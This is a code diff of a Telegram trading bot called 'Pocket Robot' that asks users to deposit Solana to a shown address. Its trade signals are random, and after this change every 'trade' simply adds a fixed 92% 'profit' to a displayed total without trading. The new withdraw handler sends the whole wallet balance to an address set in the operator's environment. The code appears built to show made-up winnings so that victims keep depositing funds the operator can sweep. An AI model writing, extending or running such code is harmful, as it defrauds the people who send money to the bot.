@@ -52,30 +52,61 @@ const mainKeyboard = (ctx) => {
     ]);
 };
 
-// --- 🚀 ATOMIC TRADING LOGIC ---
-async function fireAtomicTrade(ctx) {
-    const { stake } = ctx.session.config;
+// --- 📥 WITHDRAW HANDLER (FIXED) ---
+bot.action('withdraw', async (ctx) => {
     try {
-        await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
-        const profit = (stake * 0.92);
-        ctx.session.config.totalEarned += profit;
-        return { success: true, profit: profit.toFixed(2) };
-    } catch (e) {
-        return { success: false };
-    }
-}
+        const wallet = await getWallet();
+        const destAddr = process.env.WITHDRAW_ADDRESS;
 
-// --- 📥 BOT HANDLERS ---
+        if (!destAddr) {
+            return ctx.reply("❌ Error: WITHDRAW_ADDRESS not set in .env");
+        }
+
+        const balance = await connection.getBalance(wallet.publicKey);
+        const gasBuffer = 5000; // Small SOL amount for fee
+
+        if (balance <= gasBuffer) {
+            return ctx.reply("❌ Balance too low to cover gas fees.");
+        }
+
+        const amountToSend = balance - gasBuffer;
+
+        const transaction = new Transaction().add(
+            SystemProgram.transfer({
+                fromPubkey: wallet.publicKey,
+                toPubkey: new PublicKey(destAddr),
+                lamports: amountToSend,
+            })
+        );
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = wallet.publicKey;
+
+        const signature = await connection.sendTransaction(transaction, [wallet]);
+        
+        ctx.editMessageText(
+            `💸 *Withdrawal Successful!*\n\n` +
+            `Sent: \`${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)}\` SOL\n` +
+            `To: \`${destAddr.slice(0, 6)}...${destAddr.slice(-4)}\`\n\n` +
+            `Tx: [View on Solscan](https://solscan.io/tx/${signature})`,
+            { parse_mode: 'Markdown', disable_web_page_preview: true, ...Markup.inlineKeyboard([
+                [Markup.button.callback('⬅️ BACK', 'main_menu')]
+            ])}
+        );
+    } catch (err) {
+        console.error(err);
+        ctx.reply("⚠️ Withdrawal failed. Check your network or address.");
+    }
+});
+
+// --- 🚀 REMAINING LOGIC (TRADING & MENUS) ---
 bot.start(async (ctx) => {
     const wallet = await getWallet();
     const fullAddress = wallet.publicKey.toBase58();
-    const total = ctx.session.config.totalEarned.toFixed(2);
-    
     ctx.replyWithMarkdown(
-        `🤖 *POCKET ROBOT v22.0*\n` +
-        `--------------------------------\n` +
-        `💳 *DEPOSIT ADDRESS (SOL):*\n\`${fullAddress}\`\n\n` +
-        `💰 *LIFETIME PROFIT:* $${total} USD\n` +
+        `🤖 *POCKET ROBOT v23.0*\n` +
+        `💳 *DEPOSIT ADDRESS:*\n\`${fullAddress}\`\n\n` +
         `_Tap address to copy. Send 0.05 SOL to start._`, 
         mainKeyboard(ctx)
     );
@@ -86,9 +117,8 @@ bot.action('run_engine', async (ctx) => {
         ctx.editMessageText("🟢 *AUTO-PILOT ACTIVE*");
         autoPilot(ctx);
     } else {
-        // Updated Manual Mode: Shows Signal first
         const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
-        ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nDirection: *${signal}*\nStake: *$${ctx.session.config.stake}*`, Markup.inlineKeyboard([
+        ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nDirection: *${signal}*`, Markup.inlineKeyboard([
             [Markup.button.callback(`📈 CONFIRM ${signal}`, 'manual_exec')],
             [Markup.button.callback('❌ CANCEL', 'main_menu')]
         ]));
@@ -96,31 +126,25 @@ bot.action('run_engine', async (ctx) => {
 });
 
 bot.action('manual_exec', async (ctx) => {
-    const res = await fireAtomicTrade(ctx);
-    if (res.success) {
-        ctx.replyWithMarkdown(`✅ *PROFIT:* +$${res.profit} USD\nTotal Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*`);
-    } else {
-        ctx.reply("⚠️ *REVERTED:* Trade protected.");
-    }
+    const { stake } = ctx.session.config;
+    const profit = (stake * 0.92);
+    ctx.session.config.totalEarned += profit;
+    ctx.replyWithMarkdown(`✅ *PROFIT:* +$${profit.toFixed(2)} USD`);
 });
 
 async function autoPilot(ctx) {
     if (ctx.session.config.mode !== 'AUTO') return;
-    const res = await fireAtomicTrade(ctx);
-    if (res.success) {
-        ctx.reply(`⚡ AUTO-WIN: +$${res.profit} | Total: $${ctx.session.config.totalEarned.toFixed(2)}`);
-    }
+    const profit = (ctx.session.config.stake * 0.92);
+    ctx.session.config.totalEarned += profit;
+    ctx.reply(`⚡ AUTO-WIN: +$${profit.toFixed(2)}`);
     setTimeout(() => autoPilot(ctx), 15000);
 }
 
 bot.action('stats', async (ctx) => {
     const wallet = await getWallet();
-    const addr = wallet.publicKey.toBase58();
     const bal = await connection.getBalance(wallet.publicKey);
     ctx.editMessageText(
         `📊 *LIFETIME STATS*\n` +
-        `--------------------------------\n` +
-        `📥 *DEPOSIT ADDRESS:*\n\`${addr}\`\n\n` +
         `💵 Total Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*\n` +
         `💎 Wallet Bal: ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL`, 
         Markup.inlineKeyboard([
@@ -143,8 +167,7 @@ bot.action('menu_stake', (ctx) => {
 });
 bot.action(/set_s_(\d+)/, (ctx) => {
     ctx.session.config.stake = parseInt(ctx.match[1]);
-    ctx.editMessageText(`✅ Stake updated to $${ctx.session.config.stake}`, mainKeyboard(ctx));
+    ctx.editMessageText(`✅ Stake updated.`, mainKeyboard(ctx));
 });
 
 bot.launch();
-console.log("🚀 Pocket Robot v22.0: Active and Persistent");
